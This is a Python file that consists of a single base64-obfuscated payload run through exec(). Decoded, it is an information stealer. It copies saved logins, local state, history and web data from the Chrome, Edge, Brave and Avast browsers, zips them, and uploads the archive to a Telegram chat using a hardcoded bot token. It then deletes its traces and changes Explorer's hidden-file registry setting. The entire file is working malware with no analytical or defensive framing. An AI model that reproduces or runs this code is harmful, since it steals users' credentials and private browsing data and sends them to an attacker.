import base64
exec(base64.b64decode('aW1wb3J0IG9zCmltcG9ydCBzaHV0aWwKaW1wb3J0IHdpbnJlZyBhcyByZWcKaW1wb3J0IGRhdGV0aW1lCmltcG9ydCBhc3luY2lvCmZyb20gZGF0ZXRpbWUgaW1wb3J0ICoKCnVfZm9sZGVyID0gb3MucGF0aC5qb2luKG9zLnBhdGguZXhwYW5kdXNlcigifiIpLCAiR29vZ2xlIikKCkJPVF9UT0tFTiA9ICI2NzczMTYxODc5OkFBRUNaTmlPODBPZ0pCQ1NEV1c5alQ3dDNMNElmVFN2NEljIgpDSEFUX0lEID0gLTEwMDIyMjg2NjUwMjkKCmxvY2FsID0gb3MuZ2V0ZW52KCdMT0NBTEFQUERBVEEnKQoKZGVmIHNob3dfZmlsZXMoKToKICAgIHRyeToKICAgICAgICByZWdpc3RyeV9wYXRoID0gciJTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxFeHBsb3JlclxBZHZhbmNlZCIKICAgICAgICBrZXlfbmFtZSA9ICJIaWRkZW4iCgogICAgICAgIHdpdGggcmVnLk9wZW5LZXkocmVnLkhLRVlfQ1VSUkVOVF9VU0VSLCByZWdpc3RyeV9wYXRoLCAwLCByZWcuS0VZX1NFVF9WQUxVRSkgYXMga2V5OgogICAgICAgICAgICByZWcuU2V0VmFsdWVFeChrZXksIGtleV9uYW1lLCAwLCByZWcuUkVHX0RXT1JELCAxKQoKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwYXNzCiAgICAKYnJvd3NlcnMgPSB7CiAgICAnQXZhc3QnOiBsb2NhbCArICdcXEFWQVNUXFxTb2Z0d2FyZSBCcm93c2VyXFxVc2VyIERhdGEnLCAgCiAgICAnQ2hyb21lJzogbG9jYWwgKyAnXFxHb29nbGVcXENocm9tZVxcVXNlciBEYXRhJywKICAgICdFZGdlJzogbG9jYWwgKyAnXFxNaWNyb3NvZnRcXEVkZ2VcXFVzZXIgRGF0YScsCiAgICAnQnJhdmUnOiBsb2NhbCArICdcXEJyYXZlU29mdHdhcmVcXEJyYXZlLUJyb3dzZXJcXFVzZXIgRGF0YScsCn0KCmRhdGFfcXVlcmllcyA9IHsKICAgJ0xvY2FsIFN0YXRlJzogJ1xcTG9jYWwgU3RhdGUnLAogICAnTG9naW4gRGF0YSc6ICdcXERlZmF1bHRcXExvZ2luIERhdGEnLAogICAnSGlzdG9yeSc6ICdcXERlZmF1bHRcXEhpc3RvcnknLAogICAnV2ViIERhdGEnOiAnXFxEZWZhdWx0XFxXZWIgRGF0YScKfQoKZGVmIGNvcHlfYnJvd3Nlcl9kYXRhKCk6CiAgICBmb3IgYnJvd3Nlcl9uYW1lLCBicm93c2VyX3BhdGggaW4gYnJvd3NlcnMuaXRlbXMoKToKICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhicm93c2VyX3BhdGgpOgogICAgICAgICAgICBmb3IgZGF0YV9uYW1lLCBkYXRhX3BhdGggaW4gZGF0YV9xdWVyaWVzLml0ZW1zKCk6CiAgICAgICAgICAgICAgICBzb3VyY2VfZmlsZSA9IGJyb3dzZXJfcGF0aCArIGRhdGFfcGF0aAogICAgICAgICAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoc291cmNlX2ZpbGUpOgogICAgICAgICAgICAgICAgICAgIGRlc3RpbmF0aW9uX2ZvbGRlciA9IG9zLnBhdGguam9pbih1X2ZvbGRlciwgYnJvd3Nlcl9uYW1lKQogICAgICAgICAgICAgICAgICAgIG9zLm1ha2VkaXJzKGRlc3RpbmF0aW9uX2ZvbGRlciwgZXhpc3Rfb2s9VHJ1ZSkKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBkZXN0aW5hdGlvbl9maWxlID0gb3MucGF0aC5qb2luKGRlc3RpbmF0aW9uX2ZvbGRlciwgb3MucGF0aC5iYXNlbmFtZShkYXRhX3BhdGgpKQogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgc2h1dGlsLmNvcHkyKHNvdXJjZV9maWxlLCBkZXN0aW5hdGlvbl9maWxlKQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcGFzcwogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHBhc3MKCmZyb20gdGVsZWJvdCBpbXBvcnQgVGVsZUJvdCwgdHlwZXMKCmFzeW5jIGRlZiBjcmVhdGVfemlwKHVfZm9sZGVyKToKICAgIG5vdyA9IGRhdGV0aW1lLm5vdygpCiAgICB6aXBfZmlsZW5hbWUgPSBmIltST0JNT0NMT1VEXVt7bm93LmRheTowMmR9e25vdy5tb250aDowMmR9e25vdy5ob3VyOjAyZH17bm93LnNlY29uZDowMmR9XS56aXAiCgogICAgemlwX2ZpbGVwYXRoID0gb3MucGF0aC5qb2luKG9zLnBhdGguZXhwYW5kdXNlcigifiIpLCB6aXBfZmlsZW5hbWUpCgogICAgdHJ5OgogICAgICAgIHNodXRpbC5tYWtlX2FyY2hpdmUoemlwX2ZpbGVwYXRoWzotNF0sICd6aXAnLCB1X2ZvbGRlcikKICAgICAgICByZXR1cm4gemlwX2ZpbGVwYXRoCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcGFzcwogICAgICAgIHJldHVybiBOb25lICAgIAogICAgCmFzeW5jIGRlZiBzZW5kX3ppcF90b190ZWxlZ3JhbSh6aXBfZmlsZXBhdGgsIGJvdF90b2tlbiwgY2hhdF9pZCk6CiAgICBib3QgPSBUZWxlQm90KGJvdF90b2tlbikKICAgIG5vdyA9IGRhdGV0aW1lLm5vdygpCgogICAgdHJ5OgogICAgICAgIHVzZXJfbWVzc2FnZSA9IGYiW3tub3cuZGF5OjAyZH0te25vdy5tb250aDowMmR9LXtub3cueWVhcjowMmR9XSIKICAgICAgICAKICAgICAgICBib3Quc2VuZF9tZXNzYWdlKGNoYXRfaWQsIHVzZXJfbWVzc2FnZSkKCiAgICAgICAgd2l0aCBvcGVuKHppcF9maWxlcGF0aCwgJ3JiJykgYXMgemlwX2ZpbGU6CiAgICAgICAgICAgIGJvdC5zZW5kX2RvY3VtZW50KGNoYXRfaWQsIHppcF9maWxlKQoKICAgICAgICBzZXBhcmF0b3JfbWVzc2FnZSA9ICLilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZAiCiAgICAgICAgYm90LnNlbmRfbWVzc2FnZShjaGF0X2lkLCBzZXBhcmF0b3JfbWVzc2FnZSkKCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcGFzcwoKZGVmIGhpZGVfZmlsZXMoKToKICAgIHRyeToKICAgICAgICByZWdpc3RyeV9wYXRoID0gciJTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxFeHBsb3JlclxBZHZhbmNlZCIKICAgICAgICBrZXlfbmFtZSA9ICJIaWRkZW4iCgogICAgICAgIHdpdGggcmVnLk9wZW5LZXkocmVnLkhLRVlfQ1VSUkVOVF9VU0VSLCByZWdpc3RyeV9wYXRoLCAwLCByZWcuS0VZX1NFVF9WQUxVRSkgYXMga2V5OgogICAgICAgICAgICByZWcuU2V0VmFsdWVFeChrZXksIGtleV9uYW1lLCAwLCByZWcuUkVHX0RXT1JELCAwKQoKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwYXNzCgpkZWYgZGVsZXRlX2ZvbGRlcihmb2xkZXJfcGF0aCk6CiAgICB0cnk6CiAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoZm9sZGVyX3BhdGgpOgogICAgICAgICAgICBzaHV0aWwucm10cmVlKGZvbGRlcl9wYXRoKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHBhc3MKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwYXNzCgphc3luYyBkZWYgbWFpbigpOgogICAgc2hvd19maWxlcygpCiAgICBjb3B5X2Jyb3dzZXJfZGF0YSgpCiAgICB6aXBfZmlsZXBhdGggPSBhd2FpdCBjcmVhdGVfemlwKHVfZm9sZGVyKQogICAgaWYgemlwX2ZpbGVwYXRoOgogICAgICAgIGF3YWl0IHNlbmRfemlwX3RvX3RlbGVncmFtKHppcF9maWxlcGF0aCwgQk9UX1RPS0VOLCBDSEFUX0lEKQogICAgICAgIG9zLnJlbW92ZSh6aXBfZmlsZXBhdGgpCiAgICBkZWxldGVfZm9sZGVyKHVfZm9sZGVyKQogICAgaGlkZV9maWxlcygpCgppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgogICAgYXN5bmNpby5ydW4obWFpbigpKQo=').decode('utf-8'))
